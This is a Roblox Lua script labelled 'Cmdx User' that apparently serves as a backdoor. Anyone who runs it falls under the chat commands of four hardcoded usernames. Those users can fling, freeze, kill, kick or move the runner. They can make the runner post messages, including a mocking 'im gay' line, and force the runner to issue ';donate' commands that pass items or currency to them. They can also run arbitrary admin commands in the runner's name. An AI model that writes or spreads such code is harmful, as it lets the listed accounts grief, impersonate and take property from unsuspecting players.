--// Cmdx User //--
local user_premium__001 = game.Players:FindFirstChild("FlavorgamerYT")
local user_premium__002 = game.Players:FindFirstChild("LittleJonib")
local user_premium__003 = game.Players:FindFirstChild("xylar103")
local user_premium__004 = game.Players:FindFirstChild("whoareyiu24")
local player = game.Players.LocalPlayer

--// Commands //--
local freeze = function()
    if player.Character then
        player.Character.LowerTorso.Anchored = true
        player.Character.UpperTorso.Anchored = true
    end
end

local unfreeze = function()
    if player.Character then
        player.Character.LowerTorso.Anchored = false
        player.Character.UpperTorso.Anchored = false
    end
end

local function handleChatCommands(premiumUser)
    if premiumUser then
        premiumUser.Chatted:Connect(function(cht)
            if cht:match(".fling .") then
                if player ~= premiumUser then
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
                    local power = 99999999 -- change this to make it more or less powerful
                    game:GetService('RunService').Stepped:Connect(function()
                        player.Character.Head.CanCollide = false
                        player.Character.UpperTorso.CanCollide = false
                        player.Character.LowerTorso.CanCollide = false
                        player.Character.HumanoidRootPart.CanCollide = false
                    end)
                    wait(.1)
                    local bambam = Instance.new("BodyThrust")
                    bambam.Parent = player.Character.HumanoidRootPart
                    bambam.Force = Vector3.new(power,0,power)
                    bambam.Location = player.Character.HumanoidRootPart.Position
                end
            elseif cht:match(".freeze .") then
                if player ~= premiumUser then
                    freeze()
                end
            elseif cht:match(".unfreeze .") then
                if player ~= premiumUser then
                    unfreeze()
                end
            elseif cht:match(".kxck .") then
                if player ~= premiumUser then
                    player:Kick("You have been kicked.")
                end
            elseif cht:match(".oof .") then
                if player ~= premiumUser then
                    player.Character.Humanoid:Destroy()
                end
            elseif cht:match(".error .") then
                if player ~= premiumUser then
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
                end
            elseif cht:match(".bring .") then
                if player ~= premiumUser then
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(premiumUser.Character.UpperTorso.Position)
                end
            elseif cht:match(".sit .") then
                if player ~= premiumUser then
                    local character = player.Character
                    if character then
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        if humanoid then
                            humanoid.Sit = true
                        end
                    end
                end
            elseif cht:match(".troll .") then
                if player ~= premiumUser then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
                end
            elseif cht:match(".unsit .") then
                if player ~= premiumUser then
                    local character = player.Character
                    if character then
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        if humanoid then
                            humanoid.Sit = false
                        end
                    end
                end
            elseif cht:match(".enlighten .") then
                if player ~= premiumUser then
                    player.Backpack:FindFirstChild("The Arkenstone"):Equip()
                    game.Players:Chat(";enlighten " .. premiumUser.Name)
                end
            elseif cht:match(".donate .") then
                local text = cht:match(".donate (.+)") -- Extract text
                if player ~= premiumUser then
                    game.Players:Chat(";donate " .. text .. " " .. premiumUser.Name)
                end
            elseif cht:match(".say .") then
                local text = cht:match(".say (.+)") -- Extract text
                if player ~= premiumUser then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
                end
            elseif cht:match("^%.cmd .+") then
                local text = cht:match("^%.cmd (.+)") -- Extract text after ".cmd "
                if player ~= premiumUser then
                    game.Players.Chat:Chat(player, ";" .. text)
                end
            elseif cht:match(".cmdx") then
                if player == premiumUser then
                    game:GetService("StarterGui"):SetCore("SendNotification",{
                        Title = "Available Commands";
                        Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd";
                        Time = 5;
                        Icon = "rbxassetid://999999999";
                    })
                end
            end
        end)
    end
end

-- Connect commands for each premium user
handleChatCommands(user_premium__001)
handleChatCommands(user_premium__002)
handleChatCommands(user_premium__003)
handleChatCommands(user_premium__004)
